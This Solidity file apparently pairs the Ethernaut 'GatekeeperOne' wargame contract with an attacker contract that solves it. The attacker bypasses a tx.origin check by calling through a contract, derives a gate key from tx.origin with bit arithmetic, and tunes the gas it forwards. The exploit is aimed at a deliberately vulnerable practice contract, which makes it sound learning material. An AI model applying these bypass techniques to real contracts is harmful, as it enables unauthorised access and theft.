// SPDX-License-Identifier: MIT
// 0x47BE0Df909db14Ff6D137aedD8d42a87c74443c2
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GatekeeperOneAttacker {

    GatekeeperOne private immutable one;

    constructor(address _addr) {
        one = GatekeeperOne(_addr);
    }

    function attack(uint _gas) public {
        // x = uint64(_gateKey)
        // uint32(x) == uint16(x)
        // uint32(x) != uint64(_gateKey)
        // uint32(x) == uint16(uint160(tx.origin)
        uint16 key16 = uint16(uint160(tx.origin));
        uint64 key64 = uint64(1 << 63) + uint64(key16);
        bytes8 _gateKey = bytes8(key64);
        require(one.enter{ gas: 8191 * 3 + _gas }(_gateKey), "failed");
    }

}